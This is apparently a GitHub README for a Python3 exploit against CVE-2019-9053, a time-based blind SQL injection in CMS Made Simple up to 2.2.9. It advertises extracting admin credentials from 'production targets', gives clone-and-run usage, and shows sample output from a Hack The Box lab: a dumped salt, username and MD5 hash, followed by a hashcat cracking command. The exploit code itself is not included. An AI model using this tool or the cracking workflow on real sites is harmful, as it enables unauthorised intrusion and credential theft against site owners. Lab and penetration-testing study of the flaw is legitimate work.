# CMS Made Simple <= 2.2.9 SQL Injection (CVE-2019-9053) - Python3 Exploit
Pure Python3 port of the original 
Exploit-DB [#46635](https://www.exploit-db.com/exploits/46635) by [Daniele Scanu](https://sk4.dev/). Time-based blind SQLi to dump admin credentials from vulnerable CMS Made Simple installations.

# 🎯 **Features:**

✅ No external dependencies (only requests)

✅ Python 3.6+ native (f-strings, walrus operator)

✅ Beautiful colored output (ANSI)

✅ Stable & fast (~3-5 min dump on average connections)

✅ Timeout/error handling for production targets

✅ Hashcat-ready output (salt + MD5 format)

# 🚀 **Usage:**

```bash
# Clone & run
git clone https://github.com/tim-karov/cmsms-sqli
cd cmsms-sqli
python3 cmsms-sqli.py url
```
```bash
# Example output (HTB Writeup):
[+] CVE-2019-9053 CMS Made Simple SQLi (Python3)
[+] Target: http://machine_ip/writeup/moduleinterface.php?mact=News,m1_,default,0
[+] Dumping SALT...
5a599ef579066807
[+] Salt: L7b8v5p3
[+] Dumping USERNAME...
jkr
[+] Username: jkr
[+] Dumping PASSWORD MD5...
62def4866937f08cc13bab43bb14e6f7
[+] MD5 Hash: 62def4866937f08cc13bab43bb14e6f7
[+] Crack: hashcat -a 0 -m 20 '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' /usr/share/wordlists/rockyou.txt
```
# 🔧 **Customization**:

```bash
TIME = 3      # Sleep time (slower = more stable)
timeout = 20  # Request timeout
chars = '...' # Custom charset
```
# 📝 **Credits**:
Original Author: [Daniele Scanu](https://sk4.dev/)

Exploit-DB: [#46635](https://www.exploit-db.com/exploits/46635)

Python3 Port & Improvements: [Tim Karov](https://github.com/tim-karov)

# 📄 **License**:
MIT License - See [LICENSE](https://github.com/tim-karov/cmsms-sqli/blob/368976d14ed222f9881e6587e1c1a4b38105c98f/LICENSE)
***
⭐ Star if useful! Used in HTB/TryHackMe labs & real pentests.
